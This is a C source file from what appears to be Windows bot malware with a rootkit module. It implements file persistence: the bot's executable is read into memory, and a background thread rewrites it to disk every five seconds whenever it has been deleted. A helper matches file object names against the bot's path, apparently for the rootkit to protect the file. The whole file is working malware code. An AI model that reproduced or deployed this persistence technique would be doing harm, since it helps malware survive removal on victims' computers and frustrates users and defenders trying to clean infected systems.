#include "file_persistence.h"

#ifdef MODULE_ROOTKIT
#include "../common/utils.h"
#include "../common/string.h"
#ifdef MODULE_DEBUG
#include "debug.h"
#endif
extern bot_t bot;

static DWORD WINAPI FilePersistence_Thread(LPVOID lpArguments)
{
	DWORD dwFileSize;
	LPVOID lpBotFile;

#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	lpBotFile = NULL;
	dwFileSize = 0;

	if((lpBotFile = ReadFileFromDisk(bot.wzBotPath, &dwFileSize)) == NULL)
	{
#ifdef WDEBUG
		WDEBUG("Failed to read bot structure. File persistence wont work.");
#endif
		return 0;
	}

	while(TRUE)
	{
		if(!FileExists(bot.wzBotPath))
		{
#ifdef WDEBUG
			WDEBUG("Bot was not found! Bot will be written back!");
#endif
			WriteFileToDisk(lpBotFile, dwFileSize, bot.wzBotPath);
		}

		Utils_Sleep(5000);
	}
	return 0;
}

void StartFilePersistence(void)
{
	HANDLE hThread;

#ifdef WDEBUG
	WDEBUG("Started.");
#endif

	if((hThread = CWA(CreateThread)(0, 0, (LPTHREAD_START_ROUTINE)FilePersistence_Thread, 0, 0, 0)) != 0)
		CWA(CloseHandle)(hThread);

#ifdef WDEBUG
	WDEBUG("Finished.");
#endif
}

BOOL IsFileProtected(const POBJECT_ATTRIBUTES ObjectAttributes)
{
	if(StrLengthW(bot.wzBotPath) > 0)
	{
		return StrCompareEndW(ObjectAttributes->ObjectName->Buffer, bot.wzBotPath);
	}

	return FALSE;
}
#endif